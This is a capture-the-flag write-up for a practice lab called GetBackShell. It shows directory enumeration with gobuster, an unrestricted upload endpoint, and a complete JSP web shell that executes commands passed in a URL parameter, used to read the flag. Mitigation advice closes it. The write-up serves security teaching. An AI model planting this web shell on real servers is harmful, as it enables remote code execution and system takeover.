# Arbitrary File Upload - GetBackShell Lab

## Overview

**Arbitrary File Upload** is a critical vulnerability that arises when a web application fails to properly validate uploaded files. This allows an attacker to upload malicious files (such as web shells), potentially resulting in **Remote Code Execution (RCE)**, data compromise, or full system takeover.

This lab demonstrates how improper validation in a file upload feature can be exploited to gain unauthorized access to the server.

---

## Objectives

- Discover and analyze the file upload functionality.
- Identify accepted file types and upload behavior.
- Craft and upload a malicious JSP web shell.
- Achieve RCE and retrieve the flag from the server.

---

## Lab Details

- **Lab:** [GetBackShell](https://defhawk.com/battleground/practice-lab/all-categories/web/getbackshell)
- **Target URL:** `http://ai.ctf.defhawk.com:8080/`
- **Stack:** Apache Tomcat 9.0.106 (Java-based)

![Landing Screenshot](Screenshot%20From%202025-07-13%2003-12-15.png)

---

## 1. Reconnaissance

Since the server uses **Apache Tomcat**, it likely accepts **JSP (Java Server Pages)** files.

Start by performing directory brute-force scanning using `gobuster`:

```bash
gobuster dir -u http://ai.ctf.defhawk.com:8080 -w /usr/share/dirb/wordlists/common.txt
```

![Gobuster Initial](Screenshot%20From%202025-07-13%2013-41-26.png)

- Found endpoint: `/app`

Exploring `http://ai.ctf.defhawk.com:8080/app` didn't reveal much, so we enumerate further:

```bash
gobuster dir -u http://ai.ctf.defhawk.com:8080/app -w /usr/share/dirb/wordlists/common.txt
```

![Gobuster App](Screenshot%20From%202025-07-13%2013-48-52.png)

- Discovered: `/app/images`, `/app/uploads`
- Still no visible upload functionality.

### Upload Endpoint Found

After further fuzzing, located the endpoint:

```
/app/upload.jsp
```

![Upload JSP](Screenshot%20From%202025-07-13%2013-56-47.png)

---

## 2. Exploitation

The upload form presents three file input parameters.

Test by uploading a simple JSP-based web shell like:

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        int c;
        while ((c = in.read()) != -1) {
            out.print((char)c);
        }
        in.close();
    }
%>
```

Upload the file. The server does not restrict file type or validate content:

![Upload Success](Screenshot%20From%202025-07-13%2014-03-31.png)

Access the shell through:

```
http://ai.ctf.defhawk.com:8080/app/uploads/shell.jsp?cmd=pwd
```

![Shell pwd](Screenshot%20From%202025-07-13%2014-06-30.png)

You now have remote code execution on the server.

---

## 3. Capture the Flag

Run commands via the web shell to navigate and read the flag:

### List directory contents:

```
http://ai.ctf.defhawk.com:8080/app/uploads/shell.jsp?cmd=ls
```

![List](Screenshot%20From%202025-07-13%2014-13-07.png)

### Read the flag:

```
http://ai.ctf.defhawk.com:8080/app/uploads/shell.jsp?cmd=cat flag.txt
```

![Flag](Screenshot%20From%202025-07-13%2014-14-06.png)

Flag retrieved successfully.

---

## Mitigation Strategies

To prevent arbitrary file upload vulnerabilities:

- Whitelist allowed file extensions.
- Validate MIME types and file signatures (magic bytes).
- Rename files server-side using random UUIDs.
- Store uploaded files outside the web root if not meant for execution.
- Disable script execution in upload directories.
- Implement size and content filters.

---

## Summary

This lab showcased a classic Arbitrary File Upload vulnerability on an Apache Tomcat server. Through directory fuzzing and a JSP web shell upload, we gained remote code execution and retrieved the flag.

Always validate, sanitize, and control file upload mechanisms to secure your web application.
